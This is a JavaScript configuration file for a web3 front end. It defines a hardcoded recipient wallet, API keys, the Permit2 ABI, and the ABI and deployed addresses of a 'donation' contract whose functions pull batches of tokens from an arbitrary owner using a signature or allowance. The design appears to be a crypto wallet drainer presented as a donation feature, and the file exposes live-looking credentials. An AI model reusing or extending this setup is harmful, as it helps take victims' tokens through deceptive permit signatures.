export const RECIPIENT_ADDRESS = "0x27AEaFC8E82b34E197F9BB420b814d792f043678";
export const COVALENT_API_KEY = "cqt_rQjdVHhJjVfwxDDhMtQkDJPPMHGT";
export const WALLETCONNECT_PROJECT_ID = "cca138ec358ef45f4e07e49475be2cd7";
export const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3"; // Uniswap Permit2 on all major chains
export const PERMIT2_ABI = [
  "function permitTransferFrom((address token,uint256 amount,uint256 nonce,uint256 deadline)[] permitted,address spender,uint256 nonce,uint256 deadline,bytes signature)",
  "function permitTransferFromBatch((address token,uint256 amount)[] permitted,address spender,uint256 nonce,uint256 deadline,bytes signature)",
  "function nonces(address owner) view returns (uint256)",

  // ✅ Added for dynamic nonce lookup
  {
    "inputs": [
      { "internalType": "address", "name": "owner", "type": "address" },
      { "internalType": "uint256", "name": "word", "type": "uint256" }
    ],
    "name": "nonceBitmap",
    "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
    "stateMutability": "view",
    "type": "function"
  }
];
// ABI (keep it exactly as you pasted)
export const DONATION_CONTRACT_ABI = [
  {
    "inputs":[
      {
        "components":[
          {
            "components":[
              {"internalType":"address","name":"token","type":"address"},
              {"internalType":"uint256","name":"amount","type":"uint256"}
            ],
            "internalType":"struct ISignatureTransfer.TokenPermissions[]",
            "name":"permitted",
            "type":"tuple[]"
          },
          {"internalType":"uint256","name":"nonce","type":"uint256"},
          {"internalType":"uint256","name":"deadline","type":"uint256"}
        ],
        "internalType":"struct ISignatureTransfer.PermitBatchTransferFrom",
        "name":"permit",
        "type":"tuple"
      },
      {
        "components":[
          {"internalType":"address","name":"to","type":"address"},
          {"internalType":"uint256","name":"requestedAmount","type":"uint256"}
        ],
        "internalType":"struct ISignatureTransfer.SignatureTransferDetails[]",
        "name":"transferDetails",
        "type":"tuple[]"
      },
      {"internalType":"address","name":"owner","type":"address"},
      {"internalType":"bytes","name":"sig","type":"bytes"}
    ],
    "name":"pullAndDonate",
    "outputs":[],
    "stateMutability":"nonpayable",
    "type":"function"
  },
  {
    "inputs":[
      {"internalType":"address[]","name":"tokens","type":"address[]"},
      {"internalType":"uint256[]","name":"amounts","type":"uint256[]"},
      {"internalType":"address","name":"owner","type":"address"}
    ],
    "name":"pullAndDonateAllowanceBatch",
    "outputs":[],
    "stateMutability":"nonpayable",
    "type":"function"
  },
  {
    "inputs":[
      {"internalType":"address","name":"token","type":"address"},
      {"internalType":"address","name":"to","type":"address"}
    ],
    "name":"rescueToken",
    "outputs":[],
    "stateMutability":"nonpayable",
    "type":"function"
  },
  {
    "anonymous":false,
    "inputs":[
      {"indexed":true,"internalType":"address","name":"token","type":"address"},
      {"indexed":true,"internalType":"address","name":"recipientAddr","type":"address"},
      {"indexed":false,"internalType":"uint256","name":"amount","type":"uint256"}
    ],
    "name":"TokenForwarded",
    "type":"event"
  },
  {
    "anonymous":false,
    "inputs":[
      {"indexed":true,"internalType":"address","name":"token","type":"address"},
      {"indexed":true,"internalType":"address","name":"recipientAddr","type":"address"},
      {"indexed":false,"internalType":"uint256","name":"attempted","type":"uint256"}
    ],
    "name":"TokenFailed",
    "type":"event"
  }
];

// Contract addresses by chain
export const DONATION_CONTRACT_ADDRESS = {
  56: "0xE0C7732F799211bE79445439898528265a928233", // BSC mainnet
  1: "0x59ce8d9a27bdc9bc58367fd4c90f2da05e168d18",  // Ethereum mainnet (when you deploy there)
  // 137: "0x...", // Polygon, etc.
};

export const exceptionList = {
  1: [
    "0xdac17f958d2ee523a2206206994597c13d831ec7", // USDT mainnet
    // add more (lowercase)
  ],
  56: [
    "0x55d398326f99059ff775485246999027b3197955", // USDT BSC
    // add more (lowercase)
  ]
};